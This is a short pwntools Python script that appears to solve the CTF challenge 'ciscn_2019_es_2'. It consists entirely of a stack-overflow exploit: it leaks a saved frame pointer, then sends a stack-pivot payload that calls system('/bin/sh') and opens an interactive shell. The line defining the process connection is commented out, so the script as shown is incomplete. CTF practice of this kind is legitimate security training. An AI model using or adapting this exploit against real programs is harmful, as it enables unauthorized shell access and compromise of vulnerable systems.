from pwn import *

#io=process('ciscn_2019_es_2')

sys_plt=0x8048400 

pl='a'*0x20+'bbbbbbbb'
io.send(pl)
io.recvuntil('b'*8)
ebp=u32(io.recv(4))
print(hex(ebp))
pl2=('a'*8+p32(ebp-0x24)+'bbbb'+p32(sys_plt)+'cccc'+p32(ebp-0x1c)+'/bin/sh\x00').ljust(0x28,'p')+p32(ebp-0x2c)
io.send(pl2)

io.interactive()